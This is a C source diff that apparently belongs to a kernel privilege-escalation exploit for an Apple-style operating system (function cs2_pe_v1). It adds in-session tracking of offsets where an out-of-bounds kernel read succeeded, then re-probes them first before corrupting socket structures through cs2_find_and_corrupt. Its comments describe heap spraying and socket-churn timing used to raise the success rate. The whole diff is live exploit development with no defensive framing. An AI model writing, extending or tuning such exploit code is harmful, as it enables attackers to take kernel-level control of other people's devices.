@@ -31,6 +31,26 @@ void cs2_chain_rung_log(int rung, const char *what, uint64_t a, uint64_t b) {
    before cs2_run() (see cs2/common.h note). */
 uint64_t g_lsw_wrong_offs[16];
 int g_lsw_wrong_n = 0;
+
+/* 2026-11-21: the AUTO-ARMED hot set — the LSARM file handoff removed.
+   The old design: run cscali (writes lightsword_wrong.txt) then run cs2
+   (reads the file) — a two-tap bottleneck the user named ("the LSARM
+   feature is messing this all up"). The new design: the cs2's OWN pass-0
+   HIT offsets are recorded in-session and re-probed FIRST in every
+   subsequent pass. The file-loaded g_lsw_wrong_offs (the boot-recurrence
+   law) still merges in as the seed set — but the cs2 no longer DEPENDS
+   on a prior calib tap: the first pass discovers, the later passes
+   exploit. The concurrent spray (P177 STEP 0) provides the placement
+   pressure in the same tap. */
+uint64_t g_cs2_hot_offs[32];
+int g_cs2_hot_n = 0;
+
+void cs2_hot_record(uint64_t off) {
+    if (g_cs2_hot_n >= 32) return;
+    for (int i = 0; i < g_cs2_hot_n; i++)
+        if (g_cs2_hot_offs[i] == off) return;
+    g_cs2_hot_offs[g_cs2_hot_n++] = off;
+}
 /* LSWARM-CHURN (2026-11-15 receipts, dynamic): cs2 run alone = 0 oob
    read successes (65528 kr-fails); the SAME binary with the V23 lane's
    socket-churn thread live concurrently = 2000+ successes. The copy27
@@ -330,8 +350,17 @@ kern_return_t cs2_pe_v1(void) {
                past deadline with the target layer already proven). */
             int lswProven = 0;
             uint64_t lswHitOff = 0;
-            for (int li = 0; li < g_lsw_wrong_n; li++) {
-                size_t lt = (size_t)(g_lsw_wrong_offs[li] & ~((uint64_t)vm_page_size - 1));
+            /* 2026-11-21 AUTO-ARM: the merged set — the file-loaded boot
+               offsets (g_lsw_wrong_offs) PLUS the in-session discoveries
+               (g_cs2_hot_offs from earlier passes). The cs2 no longer
+               needs a prior cscali tap to have prioritized targets. */
+            int lswMergedN = g_lsw_wrong_n + g_cs2_hot_n;
+            if (lswMergedN > 48) lswMergedN = 48;
+            for (int li = 0; li < lswMergedN; li++) {
+                uint64_t src_off = (li < g_lsw_wrong_n)
+                    ? g_lsw_wrong_offs[li]
+                    : g_cs2_hot_offs[li - g_lsw_wrong_n];
+                size_t lt = (size_t)(src_off & ~((uint64_t)vm_page_size - 1));
                 if (lt >= search_mapping_size) continue;
                 kern_return_t lkr = cs2_oob_read(memory_object, lt, cs2_ctx.oob_size, cs2_ctx.oob_offset, read_buffer);
                 uint64_t lq0 = ((uint64_t *)read_buffer)[0];
@@ -339,6 +368,9 @@ kern_return_t cs2_pe_v1(void) {
                     s, lt, lkr,
                     (unsigned long long)lq0,
                     (unsigned long long)((uint64_t *)read_buffer)[1]);
+                if (lkr == KERN_SUCCESS) {
+                    cs2_hot_record((uint64_t)lt);   /* the auto-armed set */
+                }
                 if (lkr == KERN_SUCCESS &&
                     cs2_find_and_corrupt(memory_object, lt, read_buffer, write_buffer,
                                          target_inp_gencnt_list, &target_inp_gencnt_count, false)
